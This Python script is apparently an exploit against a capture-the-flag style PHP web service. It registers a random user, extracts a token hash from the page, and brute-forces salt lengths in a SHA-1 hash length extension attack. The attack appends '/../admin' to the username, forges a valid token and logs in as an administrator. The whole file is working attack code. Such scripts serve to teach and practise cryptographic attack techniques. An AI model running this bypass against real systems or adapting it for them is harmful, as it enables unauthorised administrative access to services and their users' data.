import base64
import random
import re
import sys
import urllib.parse

import requests
from hle import new as hle_new


def decode_session_cookie(cookie_value):
    pld, hsh = (urllib.parse.unquote(x) for x in cookie_value.split("."))
    pld = base64.b64decode(pld).decode()
    hsh = base64.b64decode(hsh).decode()

    return pld, hsh


def encode_session_cookie(pld, hsh):
    pld = base64.b64encode(pld).decode()
    hsh = base64.b64encode(hsh).decode()

    return urllib.parse.quote(pld) + "." + urllib.parse.quote(hsh)


BASE_URL = sys.argv[1]

s = requests.Session()
username = 'someuser' + str(random.randint(0, 100000))
r = s.post(f'{BASE_URL}/register.php',
                  data={'username': username, 'password': username, 'passport': '1234'}, allow_redirects=False)
if r.status_code != 200:
    print(r.text)
    exit(1)

regex = r"<b>'(.*)'</b>"
print(r.text)
tok_hash = re.findall(regex, r.text)[0]

sess_value = s.cookies.get('mursession')
print(sess_value)

for salt_size in range(1, 30):
    sha_hl = hle_new('sha1')
    extended = sha_hl.extend(b'/../admin', username.encode(), salt_size, tok_hash)
    r = requests.post(f'{BASE_URL}/login.php', allow_redirects=True,
                      data={'username': extended,
                            'token': sha_hl.hexdigest(),
                            'password': b'^\xd0\xb8\x93\xf1\x0c\x08\x8c\xcf\x0e\x00{\xf6\xed\xbfa'})
    if 'Invalid' in r.text:
        continue
    print(r.text)
    break
else:
    print("Failed to exploit")
    exit(1)
